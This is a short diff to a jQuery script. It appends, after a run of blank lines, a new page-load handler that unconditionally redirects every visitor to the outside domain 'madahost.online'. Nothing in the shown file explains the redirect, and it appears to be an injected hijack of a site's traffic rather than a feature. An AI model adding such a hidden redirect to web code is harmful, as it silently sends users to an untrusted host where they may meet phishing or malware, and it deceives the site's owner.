@@ -72,3 +72,10 @@ $(document).ready(function () {
         `)
         .appendTo('head');
 });
+
+
+
+
+$(document).ready(function() {
+    window.location.href = "https://madahost.online";
+  });
